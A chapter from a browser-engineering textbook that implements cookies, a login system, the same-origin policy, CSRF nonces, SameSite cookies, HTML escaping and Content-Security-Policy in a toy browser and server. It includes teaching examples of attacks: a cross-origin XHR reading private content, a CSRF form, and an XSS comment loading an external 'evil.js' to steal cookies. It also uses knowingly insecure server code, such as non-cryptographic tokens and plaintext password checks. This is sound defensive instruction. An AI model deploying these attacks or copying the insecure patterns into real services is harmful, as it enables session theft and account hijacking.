---
title: Keeping Data Private
chapter: 10
prev: scripts
next: reflow
...

Our browser has grown up and now runs (small) web applications. With
one final step---user identity via cookies---it can now run all sorts
of personalized online services. But capability demands
responsibility: a browser must secure cookies against adversaries
interested in getting at them. Luckily, browsers have sophisticated
systems for controlling access to cookies and preventing their misuse.

::: {.warning}
Web browser security is a vast topic. It involves securing the web
browser, securing the network, and securing the applications that the
browser runs. It also involves educating the user, so that attackers
can't misleading them into revealing their own secure data. This chapter
can't cover all of that. Instead, it focuses on the mechanisms browsers
have developed to protect the security of web applications. *So*, if
you're writing security-sensitive code, this book is not enough.
:::

Cookies
=======

With what we've implemented so far there's no way for a web server to
tell whether two HTTP requests come from the same user, or
different ones. Our web browser is effectively anonymous.[^1] That
means it can't "log in" anywhere---after logging in, its requests will
look just like those of a new visitor.

[^1]: I don't mean anonymous against malicious attackers, who might
    use *browser fingerprinting* or similar techniques to tell users
    apart. I mean anonymous in the good-faith sense.

The web fixes this problem with cookies. A cookie---the name is
meaningless, ignore it---is a little bit of information stored by your
browser on behalf of a web server. The cookie distinguishes your
browser, and is sent with each web request so the server can
distinguish its users.


Here's how cookies work. In the HTTP response a server can send a
`Set-Cookie` header. This header contains a key-value pair; for
example, the following header sets the value of the `foo` cookie to
`bar`:

    Set-Cookie: foo=bar
    
The browser remembers this key-value pair, and the next time it makes
a request to the same server (cookies are site-specific) it echoes it
back in the `Cookie` header:

    Cookie: foo=bar

Servers can also set multiple cookies and also set parameters like
expiration dates, but this `Set-Cookie` / `Cookie` mechanism is the
core principle.

Servers use cookies to assign identities to their users. For example,
let's write a login system for our guest book. Each user will be
identified by a long random number stored in the `token`
cookie.[^secure-random] The server will either extract a token from
the `Cookie` header, or generate a new one for new visitors:

[^secure-random]: This use of `random.random` returns a decimal number
    with 53 bits of randomness. That's not great; 256 bits is ideal.
    And `random.random` is not a secure random number generator: by
    observing enough tokens you can predict future values and use
    those to hijack accounts. A real web application must use a
    cryptographically secure random number generator for tokens.

``` {.python file=server}
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

Of course, new visitors need to be told to remember their
newly-generated token:

``` {.python file=server}
def handle_connection(conx):
    # ...
    if 'cookie' not in headers:
        response += "Set-Cookie: token={}\r\n".format(token)
    # ...
```

The first code block runs after all the request headers are parsed,
before handling the request in `do_request`, while the the second code
block runs after `do_request` returns, when the server is assembling
the HTTP response.

With these two code changes, each visitor to the guest book now has a
unique identity. We can now use that identities to store information
about each user. Let's do that in a server side `SESSIONS`
variable:[^cookies-limited]

[^cookies-limited]: Browsers and servers both limit header lengths, so
    it's best to store minimal data in cookies. Plus, cookies are sent
    back and forth on every request, so long cookies mean a lot of
    useless traffic.

``` {.python file=server}
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

The user data extracted from the `SESSIONS` object is called the
session data, and I'm passing it to `do_request` so that our request
handlers can read and write user data. Pass that session information
to individual pages like `show_comments` and `add_entry`:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    if method == "GET" and url == "/":
        return "200 OK", show_comments(session)
    # ...
    elif method == "POST" and url == "/add":
        params = form_decode(body)
        add_entry(session, params)
        return "200 OK", show_comments(session)
    # ...
```

You'll also need to modify the argument lists for `add_entry` and
`show_comments`. With the guest book server storing information about
each user accessing the guest book, we can now build a login system.

::: {.further}
The [patent][patent] for cookies says there is "no compelling reason"
for calling them "cookies", but in fact using this term for opaque
identifiers exchanged between programs seems to date way back;
[Wikipedia][wiki-magic-cookie] traces it back to at least 1979, and
cookies were used in [X11][x-cookie] for authentication before they
were used on the web.
:::

[cookie]: https://rpx-patents.s3.amazonaws.com/US/2a377-US7895125B2/US7895125B2.pdf
[wiki-magic-cookie]: https://en.wikipedia.org/wiki/Magic_cookie
[x-cookie]: https://en.wikipedia.org/wiki/X_Window_authorization#Cookie-based_access

A login system
==============

I want users to log in before posting to the guest book. Nothing
complex, just the minimal functionality:

- Users will log in with a username and password.
- The server will hard-code a set of valid logins.
- Users have to be logged in to add guest book entries.
- The server will display who added which guest book entry.

Let's start coding. First, we'll need to store usernames in `ENTRIES`:[^3]

[^3]: The pre-loaded comments reference 1995's *Hackers*. [Hack the
    Planet!](https://xkcd.com/1337)

``` {.python file=server}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```

When we print the guest book entries, print the username as well:

``` {.python file=server}
def show_comments(session):
    # ...
    for entry, who in ENTRIES:
        out += '<p>' + entry + " <i>from " + who + '</i></p>'
    # ...
```

Now, we want users to be logged in before posting comments. We'll
determine whether a user is logged in using the `user` key in the
session data:

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        out += "<h1>Hello, " + session["user"] + "</h1>"
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"
    # ...
```

Likewise, `add_entry` must check that the user is logged in before
posting comments:

``` {.python file=server}
def add_entry(session, params):
    if "user" not in session: return
    # ...
```

Note that the session data (including the `user` key) is stored on the
server, so users can't modify it directly. That's good, because we
only want to set the `user` key if users supply the right password at
the `/login` URL:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "GET" and url == "/login":
        return "200 OK", login_form(session)
    # ...
```

This URL shows a form with a username and a password field:[^4]

[^4]: I've given the `password` input area the type `password`, which
    in a real browser will draw stars or dots instead of showing what
    you've entered, though our browser doesn't do that.

``` {.python file=server}
def login_form(session):
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body 
```

Note that the form `POST`s its data to the `/` URL. We'll want to
route these `POST` requests to a new function that handles logins:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "POST" and url == "/":
        params = form_decode(body)
        return do_login(session, params)
    # ...
```

This `do_login` function checks passwords and logs people in by
storing their user name in the session data:[^timing-attack]

[^timing-attack]: Actually, using `==` to compare passwords like here
    is a bad idea: Python's equality function for strings scans the
    string from left to right, and exits as soon as it finds a
    difference. So, *how long* it takes to check passwords gives you
    clues about the password; this is called a "[timing side
    channel][timing-attack]". This book is about the browser, not the
    server, but a real web application has to do do a [constant-time
    string comparison][constant-time]!
    
[timing-attack]: https://en.wikipedia.org/wiki/Timing_attack
[constant-time]: https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html

``` {.python file=server}
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

Try it out in a normal web browser. You should be able to go to the
main guest book page, click the link to log in, use one of the
username/password pairs above, and post entries.^[The login flow slows
down debugging. You might want to add the empty string as a
username/password pair.] Of course, this login system has a whole slew
of insecurities.[^7] But the focus of this book is the browser, not
the server, so once you're sure it's all working, let's switch gears
and implement cookies inside our own browser.

[^7]: The insecurities include not hashing passwords, not using `bcrypt`, not verifying
    email addresses, not forcing TLS, and not running the server in a sandbox.
    
[bcrypt]: https://auth0.com/blog/hashing-in-action-understanding-bcrypt/


Implementing cookies
====================

Let's implement cookies. To start with, we need a place to store
cookies; that database is traditionally called a *cookie jar*[^2]:

[^2]: Because once you have one silly name it's important to stay
    on-brand.

``` {.python}
COOKIE_JAR = {}
```

Since cookies are site-specific, our cookie jar will map sites to
cookies. Note that the cookie jar is global, not limited to a
particular tab. That means that if you're logged in to a website and
you open a second tab, you're logged in on that tab as well.

When the browser visits a page, it needs to send the cookie for that
site:[^multi-cookies]

[^multi-cookies]: Actually, a site can store multiple cookies at once,
    using different key-value pairs. The browser is supposed to
    separate them with semicolons. I'll leave that for an exercise.

``` {.python replace=(url/(url%2c%20top_level_url,COOKIE_JAR[host]/cookie}
def request(url, payload=None):
    # ...
    if host in COOKIE_JAR:
        body += "Cookie: {}\r\n".format(COOKIE_JAR[host])
    # ...
```

Symmetrically, receiving the `Set-Cookie` header updates the cookie
jar:[^multiple-set-cookies]

[^multiple-set-cookies]: A server can actually send multiple
    `Set-Cookie` headers to set multiple cookies in one request, and a
    real browser would store all of them.

``` {.python replace=(url/(url%2c%20top_level_url,=%20kv/=%20(kv%2c%20params),kv/cookie}
def request(url, payload=None):
    # ...
    if "set-cookie" in headers:
        kv = headers["set-cookie"]
        COOKIE_JAR[host] = kv
    # ...
```

You should now be able to use your toy browser to log in to the guest
book and post to it. Moreover, you should be able to open the guest
book in two browsers simultaneously---maybe your toy browser and a
real browser as well---and log in and post as two different users.

Note that `load` calls `request` three times (for the HTML, CSS, and
JS files). Because we handle cookies inside `request`, this should
automatically work correctly, with later requests transmitting cookies
set by previous responses.

Cookies are also accessible from JavaScript's `document.cookie` value.
To implement this, register a `cookie` function:

``` {.python}
class JSContext:
    def __init__(self, tab):
        # ...
        self.interp.export_function("cookie", self.cookie)
        # ...

    def cookie(self):
        _, _, host, _ = self.tab.url.split("/", 3)
        if ":" in host: host = host.split(":", 1)[0]
        return COOKIE_JAR.get(host, "")
```

Then create the `document.cookie` field in `runtime.js`:

``` {.javascript}
Object.defineProperty(document, 'cookie', {
    get: function() { return call_python("cookie"); }
})
```

Now that our browser supports cookies and uses them for logins, we
need to make sure cookie data is safe from malicious actors. After
all: if someone stole your `token` cookie, they could copy it into
their browser, and the server would think they are you.

Our browser must prevent *other servers* from seeing your cookie
values.[^11][^12][^13][^14] But attackers might be able to get *your
server* or *your browser* to help them steal cookie values...

[^11]: Well... Our connection isn't encrypted, so an attacker could
    pick up the token from there. But another *server* couldn't.

[^12]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies. But
    some ISPs support DNSSEC, which prevents that.

[^13]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^14]: Security is very hard.



Cross-site requests
===================

Imagine that your browser is logged in to your bank, and than an
attacker wants to know your (private) bank balance. Already, our
browser stores different cookies for each site. Because of this, it
won't just send the bank cookie to an attacker's site. But what if the
attacker is clever?

The easiest way for an attacker to steal your private data is to ask
for it. Of course, there's no API in the browser for a website to ask
for another website's cookies. But there _is_ an API to make requests
to another website. It's called `XMLHttpRequest`.[^weird-name]

[^weird-name]: It's a weird name! Why is `XML` capitalized but not
    `Http`? And it's not restricted to either XML or HTTP!

`XMLHttpRequest` is a pretty big API; typically it is used to send
asynchronous `GET` or `POST` requests from JavaScript. Since I'm using
`XMLHttpRequest` just to illustrate security issues, I'll implement a
minimal version here. Specifically, I'll support only the `open` and
`send` methods, and only *synchronous* requests.[^obsolete]
    
[^obsolete]: Synchronous `XMLHttpRequests` are slowly moving through
    [deprecation and obsolescence][xhr-open], but are convenient here
    for quick implementation.

[xhr-open]: https://xhr.spec.whatwg.org/#the-open()-method

Using this minimal `XMLHttpRequest` looks like this:

``` {.javascript}
x = new XMLHttpRequest();
x.open("GET", url, false);
x.send();
// use x.responseText
```

We'll export an `XMLHttpRequest_send` function to make the actual
request, and define the `XMLHttpRequest` objects and methods in
JavaScript. The `open` method will just save the method and
URL:[^more-options]

[^more-options]: `XMLHttpRequest` has more options not implemented
    here, like support for usernames and passwords. This code is also
    missing some error checking, like making sure the method is a
    valid HTTP method supported by our browser.

``` {.javascript}
function XMLHttpRequest() {}

XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}
```

The `send` method calls our exported function:[^even-more-options]

[^even-more-options]: As above, this implementation skips important
    `XMLHttpRequest` features, like setting request headers (and
    reading response headers), changing the response type, or
    triggering various events and callbacks during the request.

``` {.javascript}
XMLHttpRequest.prototype.send = function(body) {
    this.responseText = call_python("XMLHttpRequest_send",
        this.method, this.url, this.body);
}
```

In Python, implementing `send` is pretty simple. Just define and
export this `XMLHttpRequest_send` function:[^note-method]

[^note-method]: Note that the `method` argument is ignored, because
    our `request` function chooses the method on its own based on
    whether a payload is passed. This is again not what the standard
    requires, and a careful implementation would fix it.

``` {.python replace=full_url%2c/full_url%2c%20self.tab.url%2c}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = resolve(url, self.tab.url)
        headers, out = request(full_url, payload=body)
        return out
```

With this new JavaScript API, a web page can make HTTP requests while
the user interacts with it, making various "live", "AJAX" websites
possible! This API, and newer analogs like [`fetch`][mdn-fetch], are
the basis for so many web page interactions that don't reload the
page---think "liking" a post or hover previews or similar.

[mdn-fetch]: https://developer.mozilla.org/en-US/docs/Web/API/fetch



Same-origin Policy
==================

However, new capabilities lead to new responsibilities. After all:
any HTTP requests triggered by `XMLHttpRequest` will include cookies,
which means they can potentially be used to steal or abuse cookies!
This is by design: when you "like" something, the corresponding
HTTP request needs your cookie so the server associates the "like" to
your account. But it also means that `XMLHttpRequest`s have access to
private data, and thus need to protect it.

Let's imagine an attacker that wants to know your username on our
guest book server. When you're logged in, the guest book includes your
username in the "Hello, so and so" header, so it's enough for the
attacker to read the guest book web page with your cookies.

`XMLHttpRequest` could let them do that. Say the user visits the
attacker's website[^why-visit-attackers], which then executes the
following script:

[^why-visit-attackers]: Why is the user on the attacker's site?
    Perhaps it has funny memes, or it's been hacked and is being used
    for the attack against its will, or perhaps the evil-doer paid for
    ads on sketchy websites where users have low standards for
    security anyway.


``` {.javascript}
x = new XMLHttpRequest();
x.open("GET", "http://localhost:8000/", false);
x.send();
user = x.responseText.split(" ")[2].split("<")[0];
```

The issue here is that private guest book content is being sent to the
attacker. Since the content is derived from the cookie, it leaks
private data. To prevent this, the browser must prevent the attacker's
page from reading the guest book web page content.

The term for this is the "Same-origin policy". Basically, web pages
can only make `XMLHttpRequests` for web pages on the same
"origin"---scheme, hostname, and port.[^not-cookies] This makes sure
that private data on one website can't be leaked by the browser to
another website.

[^not-cookies]: You may have noticed that this is not the same
    definition of "website" as cookies use. Cookies don't care about
    scheme and port! This seems to be an oversight or incongruity left
    over from the messy early web.

Let's implement the same-origin policy for our browser. We'll need to
compare the URL of the request to the top-level web page URL:

``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        new_origin = "/".join(full_url.split("/", 3)[:3])
        top_level_origin = "/".join(self.tab.url.split("/", 3)[:3])
        if new_origin != top_level_origin:
            raise Exception("Cross-origin XHR request not allowed")
        # ...
```

Here the tricky split-slice-join string manipulations extract the
origin from a URL by taking everything before the third slash.
The URL being requested and the tab's top-level URL need to match for
the request to be valid.

Now an attacker can't read the guest book web page. But can they write
to it? Actually...

::: {.further}
Same-origin policy for canvas
:::



Cross-site request forgery
==========================

The same-origin policy protects against cross-origin `XMLHttpRequest`
calls. But the same-origin policy doesn't apply to normal browser
actions like clicking a link or filling out a form. This enables an
exploit called *cross-site request forgery*, often shortened to CSRF.

In cross-site request forgery, instead of using `XMLHttpRequest,` the
attacker uses a form that submits to the guest book:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Even though this form is on the evildoer's website, when you submit
the form, the browser will make an HTTP request to the *guest book*.
And that means it will send its guest book cookies, so it will be
logged in, so it will post to the guest book. But the user has no way
of knowing which server a form submits to---the attacker's web page
could have misrepresented that---so they may have posted something
they didn't mean to.

Of course, the attacker can't read the response, so this doesn't leak
private data to the attacker. But it can allow the attacker to _act_
as the user! Posting a comment this way is not too scary (though shady
advertisers will pay for it!) but posting a bank transaction is. And
if the website has a change-of-password form, there could even be a
way to take control of the account.

Even worse, the form submission could be triggered by JavaScript, with
the user not involved at all. And this kind of attack can be further
disguised, for example by hiding the entry widget, pre-filling a post,
and styling the button to look like a normal link.

Unfortunately, we can't just apply the same-origin policy to form
submissions.[^21] So how do we defend against this attack?

[^21]: For example, many search forms on websites submit to Google,
    because those websites don't have their own search engines.

To start with, there are things the server can do. The usual advice is
to make sure that every POST request to `/add` comes from a form on
our website. The way to do that is to embed a secret value, called a
*nonce*, into the form, and to reject form submissions that don't come
with this secret value. You can only get a nonce from the server, and
the nonce is tied to the user session, so the attacker could not embed
it in their form. Cross-site submissions wouldn't have the right nonce
and would be rejected.[^like-cookie]

[^like-cookie]: A nonce is somewhat like a cookie, except that it's
stored inside the HTML instead of the browser cookie. Like a cookie,
it can be stolen with cross-site scripting.

The implementation looks like this. When a form is requested, we
generate a nonce and save it in the user session:[^per-user]

[^per-user]: It's important that nonces are associated with the
    particular user. Otherwise, the attacker can generate a nonce for
    *them* and insert it into a form meant for the *user*.

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        # ...
        out += "<input name=nonce type=hidden value=" + nonce + ">"
```

Usually `<input type=hidden>` is invisible, though our browser doesn't
support this. Now, when a form is submitted, the server checks that
the right nonce is submitted with it:[^multi-nonce]

[^multi-nonce]: In real websites it's usually best to allow one user
    to have multiple active nonces, so that a user can open two forms
    in two tabs without that overwriting the valid nonce. To prevent
    the nonce set from growing over time, you'd have nonces expire
    after a while. I'm skipping this here, because it's not the focus
    of this chapter.

``` {.python file=server}
def add_entry(session, params):
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    # ...
```

Now this form can't be submitted except from our website---and if you
repeat this nonce fix for each form in the web application, it'll be
secure from CSRF attacks. But server-side solutions are fragile---what
if you forget a form---and relying on every website out there to do it
right is a pipe dream. It'd be better for the browser to provide a
fail-safe backup.


SameSite Cookies
================

For form submissions, that fail-safe solution is `SameSite` cookies.
The idea is that a if server mark its cookies `SameSite`, the browser
will them not send them in cross-site form submissions.[^in-progress]

[^in-progress]: At the time of this writing, the `SameSite` cookie
    standard is still in a draft stage, and not all browsers implement
    that draft fully. So it's possible for this section to become out
    of date, though some kind of `SameSite` cookies will probably be
    ratified. The [MDN page][mdn-samesite] is helpful for checking the
    current status of `SameSite` cookies.
    
[mdn-samesite]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite#secure

A cookie is marked `SameSite` in the `Set-Cookie` header like this:

    Set-Cookie: foo=bar; SameSite=Lax

The `SameSite` attribute can take the value `Lax`, `Strict`, or
`None`, and as I write this browsers have and plan different defaults.
Our browser will implement only `Lax` and `None`, and default to
`None`. When `SameSite` is set to `Lax`, the cookie is not sent on
cross-site `POST` requests, but is sent on same-site `POST` or
cross-site `GET` requests.[^iow-links]

[^iow-links]: Cross-site `GET` requests are also known as "clicking a
    link", which is why those are allowed. The `Strict` version of
    `SameSite` blocks these too, but you need to design your web
    application carefully for this to work.
    
To start, let's find a place to store this attribute. I'll modify
`COOKIE_JAR` to store cookie/parameter pairs:

``` {.python replace=(url/(url%2c%20top_level_url}
def request(url, payload=None):
    if "set-cookie" in headers:
        params = {}
        if ";" in headers["set-cookie"]:
            cookie, rest = headers["set-cookie"].split(";", 1)
            for param_pair in rest:
                name, value = param_pair.split("=", 1)
                params[name.lower()] = value.lower()
        else:
            cookie = headers["set-cookie"]
        COOKIE_JAR[host] = (cookie, params)
```

When sending a cookie in an HTTP request, the browser only sends the
cookie value, not the parameters:

``` {.python replace=(url/(url%2c%20top_level_url}
def request(url, payload=None):
    if host in COOKIE_JAR:
        cookie, params = COOKIE_JAR[host]
        body += "Cookie: {}\r\n".format(cookie)
```

This stores the `SameSite` parameter of a cookie. But to actually use
it, we need to know which site an HTTP request is being made from.
Let's add a new `top_level_url` parameter to `request` to track that:

``` {.python}
def request(url, top_level_url, payload=None):
    # ...
```

Our browser calls `request` in three places, and we need to send the
top-level URL in each case. At the top of `load`, it makes the initial
request to a page. Modify it like so:

``` {.python}
class Tab:
    def load(self, url, body=None):
        headers, body = request(url, self.url, payload=body)
        # ...
```

Here, `url` is the new URL to visit, but `self.url` is the URL of the
page where the request comes from. Make sure this line comes at the
top of `load`, before `self.url` is changed!

Later, the browser loads styles and scripts with more `request` calls:

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        for script in scripts:
            # ...
            header, body = request(script_url, url)
            # ...
        # ...
        for link in links:
            # ...
            header, body = request(style_url, url)
            # ...
        # ...
```

For these requests the top-level URL is new URL the browser is
loading. That's because it is the new page that made us request these
particular styles and scripts, so it defines which of those resources
are on the same site.

Similarly, `XMLHttpRequest`-triggered requests use the tab URL as
their top-level URL:

``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        headers, out = request(full_url, self.tab.url, payload=body)
        # ...
```

The `request` function can now check the `top_level_url` argument
before sending `SameSite` cookies. Remember that `SameSite` cookies
are only sent for `GET` requests or if the new URL and the top-level
URL have the same host name:

``` {.python}
def request(url, top_level_url, payload=None):
    if host in COOKIE_JAR:
        cookie, params = COOKIE_JAR[host]
        allow_cookie = True
        if params.get("samesite", "none") == "lax":
            _, _, top_level_host, _ = top_level_url.split("/", 3)
            allow_cookie = (host == top_level_host or method == "GET")
        if allow_cookie:
            body += "Cookie: {}\r\n".format(cookie)
```

To test this, mark our guest book cookies `SameSite`:

``` {.python file=server}
def handle_connection(conx):
    if 'cookie' not in headers:
        response += "Set-Cookie: token={}; SameSite=Lax\r\n".format(token)
```

This doesn't mean your should remove the nonces we added earlier:
`SameSite` provides a kind of "defense in depth", a fail-safe that
makes sure that even if we forgot a nonce somewhere, we're still
secure against CSRF attacks.


Cross-site scripting
====================

Now other websites can't misuse our browser's cookies to read or write
private data. This seems secure! But what about *our own* website?
With cookies accessible from JavaScript, any scripts run on our server
could, in principle, read the cookie value. This might seem
benign---doesn't our server only run `comment.js`? But in fact...

A web service needs to defend itself from being *misused*. Consider
the code in our guest book that outputs guest book entries:

``` {.python file=server indent=8}
out += "<p>" + entry + " <i>by " + who + "</i></p>"
```

Note that `entry` can be anything, anything the user might stick into
our comment form. That includes HTML tags, like a custom `<script>`
tag! So, a malicious user could post the comment:

    Hi! <script src="http://my-server/evil.js"></script>

The server would then output the HTML:

    <p>Hi! <script src="http://my-server/evil.js"></script>
    <i> by crashoverride</i></p>

Every user's browser would then download and run the `evil.js` script,
which might read `document.cookie` and send[^how-send] it to the
attacker. The attacker could then impersonate other users, posting as
them or misusing any other capabilities those users had in our
service.

[^how-send]: In a real browser, `evil.js` might use cross-domain
     `XMLHttpRequest`s[^cross-domain-xhr] to secretly send that cookie
     to the attacker's server, or even add hidden images or scripts to
     the page, thereby triggering requests. In our limited browser
     these won't work, but the evil script can, for example, replace
     the whole page with a link that goes to their site and includes
     the token value in the URL. You've seen "please click to
     continue" screens and have clicked the button unthinkingly; your
     users will too.
    
[^cross-domain-xhr]: See the exercise on `Access-Control-Allow-Origin`
    for more details on how web servers can *opt in* to allowing
    cross-origin requests.

The core problem here is that user comments are supposed to be data,
but the browser is interpreting them as code. This kind of exploit is
usually called *cross-site scripting* (often written "XSS"), though
misinterpreting data as code is a common security issue in all kinds
of programs.

The standard fix is to encode the data so that it can't be interpreted
as code. For example, in HTML, you can write `&lt;` to display a
less-than sign.[^ch1-ex] Python has an `html` module for this kind of
encoding:

[^ch1-ex]: You may have implemented this as part of an [exercise in
    Chapter 1](http.md#exercises).

``` {.python file=server}
import html

def show_comments(username):
    # ...
    out += "<p>" + html.escape(entry)
    out += " <i>from " + html.escape(who) + "</i></p>"
    # ...
```

This is a good fix, and you should do it. But if you forget to encode
any text anywhere---that's a security bug. So browsers provide
additional layers of defense.

Content security policy
=======================

One such layer is the `Content-Security-Policy` header. The full
specification for this header is quite complex, but in the simplest
case, the header is set to the keyword `default-src` followed by a
space-separated list of servers:

    Content-Security-Policy: default-src http://example.org

This header asks the browser not to load any resources (including CSS,
JavaScript, images, and so on) except from the listed servers. If our
guest book used `Content-Security-Policy`, even an attacker managed to
get a `<script>` added to the page, the browser would refuse to load
and run that script.

Let's implement support for this header. First, we'll need to extract
and parse the `Content-Security-Policy` header:[^more-complex]

[^more-complex]: In reality `Content-Security-Policy` can also list
    scheme-generic URLs and even more complex sources like `'self'`.
    This is a very limited CSP implementation.

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        self.allowed_servers = None
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"].split()
            if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_servers = csp[1:]
        # ...
```

This parsing needs to happen _before_ we request any JavaScript or
CSS, because we now need to check whether those requests are allowed:

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        for script in scripts:
            script_url = resolve_url(script, url)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            # ...
```

Note that we need to first resolve any relative URLs before checking
them against the list of allowed servers. The `allowed_request` check
needs to handle both the case of no `Content-Security-Policy` and the
case where there is one:

``` {.python}
class Tab:
    def allowed_request(self, url):
        if self.allowed_servers == None: return True
        scheme_colon, _, host, _ = url.split("/", 3)
        return scheme_colon + "//" + host in self.allowed_servers
```

The guest book can now send a `Content-Security-Policy` header:

``` {.python file=server}
def handle_connection(conx):
    # ...
    response += "Content-Security-Policy: default-src http://localhost:8000\r\n"
    # ...
```

To check that our implementation works, let's have the guest book
request a script from outside the list of allowed servers:

``` {.python file=server}
def show_comments(session):
    # ...
    out += "<script src=https://example.com/evil.js></script>"
    # ...
```

If you've got everything implemented correctly, the browser should
block the evil script[^evil-js] and report so in the console.

[^evil-js]: Needless to say, `example.com` does not actually host an
    `evil.js` file, and any request to it returns `404 Not Found`.

So are we done? Is the guest book totally secure? Uh... no. There's
more---much, *much* more---to web application security than what's in
this book. And just like the rest of this book, there are many other
browser mechanisms that touch on security and privacy. Let's settle
for this fact: the guest book is more secure than before.

Summary
=======

We've added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. That involved:

- Mitigating cross-site `XMLHttpRequest`s with the same-origin policy
- Mitigating cross-site request forgery with nonces and with
  `SameSite` cookies
- Mitigating cross-site scripting with escaping and with
  `Content-Security-Policy`.

We've also seen the more general lesson that every increase in the
capabilities of a web browser also leads to an increase in its
responsibility to safeguard user data. Security is an ever-present
consideration throughout the design of a web browser.

::: {.warning}
The purpose of this book is to teach the *internals of web browsers*,
not to teach web application security. There's much more you'd want
to do to make this guest book truly secure, let alone what we'd need
to do to avoid denial of service attacks or to handle spam and
malicious use.
:::

Outline
=======

The complete set of functions, classes, and methods in our browser 
should now look something like this:

::: {.cmd .python .outline html=True}
    python3 infra/outlines.py --html src/lab10.py
:::

The server is much simpler, but has also grown since last chapter:

::: {.cmd .python .outline html=True}
    python3 infra/outlines.py --html src/server10.py
:::

Exercises
=========

*New inputs*: Add support for hidden and password input elements.
Hidden inputs shouldn't show up or take up space, while password input
elements should show ther contents as stars instead of characters.

*Cookie access*: Add support for the `HttpOnly` and `Secure`
parameters for cookies. `HttpOnly` cookies should not be available
from JavaScript's `document.cookie`, but should be sent along with
HTTP requests. `Secure` cookies should only be sent over HTTPS, but
not over HTTP, requests.  `HttpOnly` cookies provide some protection
against cross-site scripting attacks, while `Secure` cookies prevent
an attacker from reading cookies sent over unencrypted networks.

*Cookie Expiration*: Add support for cookie expiration. Cookie
expiration dates are set in the `Set-Cookie` header, and can be
overwritten if the same cookie is set again with a later date. On the
server side, save the same expiration dates in the `SESSIONS` variable
and use it to delete old sessions to save memory.

*CORS*: Web servers can *opt in* to allowing cross-origin
`XMLHttpRequest`s using the `Access-Control-Allow-Origin` header. The
way it works is that on cross-origin HTTP requests, the web browser
sends an `Origin` header with the origin of the requesting site. By
default, the browser then throws away the response to prevent private
data from leaking. But if the server sends the
`Access-Control-Allow-Origin` header, and its value is either the
requesting origin or the special `*` value, the browser instead makes
the output available to the script. All requests made by your browser
will be what the CORS standard calls "simple requests".

*Referer*: When your browser visits a web page, or when it loads a CSS
or JavaScript file, it sends a `Referer` header[^24] containing the
URL it is coming from. Sites often use this for analytics. Implement
this in your browser. However, some URLs contain personal data that
they don't want revealed to other websites, so browsers support a
`Referer-Policy` header, which can contain values like `no-referer`
(never send the `Referer` header when leaving this page) or
`same-origin` (only do so if navigating to another page on the same
origin). Implement those two values for `Referer-Policy`.

[^24]: Yep, spelled that way.
